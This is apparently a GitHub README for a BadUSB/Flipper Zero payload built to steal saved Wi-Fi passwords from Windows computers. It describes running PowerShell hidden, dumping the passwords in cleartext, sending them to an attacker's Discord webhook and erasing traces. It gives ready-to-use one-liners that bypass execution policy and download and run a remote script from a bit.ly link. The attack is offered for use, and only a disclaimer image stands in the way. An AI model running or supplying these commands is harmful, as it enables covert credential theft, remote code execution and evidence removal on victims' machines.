# WLAN Windows Password - BADUSB ✅

A script used to stole target WLAN Passwords.


**Category**: WLAN, Credentials

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Faleff-github%2Fmy-flipper-shits&count_bg=%233C3C3C&title_bg=%233C3C3C&icon=linux.svg&icon_color=%23FFFFFF&title=views&edge_flat=false)](https://github.com/aleff-github/my-flipper-shits)

## Disclaimer

<div align=center>

<img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/gif/flipper_zero%20(15).gif" width="209" /><br><img src="https://github.com/aleff-github/my-flipper-shits/blob/main/img/DISCLAIMER.png" width="600" />

</div>

## Description

A script used to stole target WLAN Passwords.

Opens PowerShell hidden, grabs wlan passwords, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.

Then it cleans up traces of what you have done after.

## Getting Started

### Dependencies

* An internet connection
* Windows 10,11

### Executing program

* Plug in your device
* Invoke 2 netsh commands
* Invoke-WebRequest will be entered in the Run Box to send the content

ENG 🇺🇸
```powershell
powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/WindowsWiFiPasswordsENG | iex
```

ITA 🇮🇹
```powershell
powershell -w h -ep bypass $discord='<your_webhook_here>';irm bit.ly/WindowsWiFiPasswordsITA | iex
```

You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
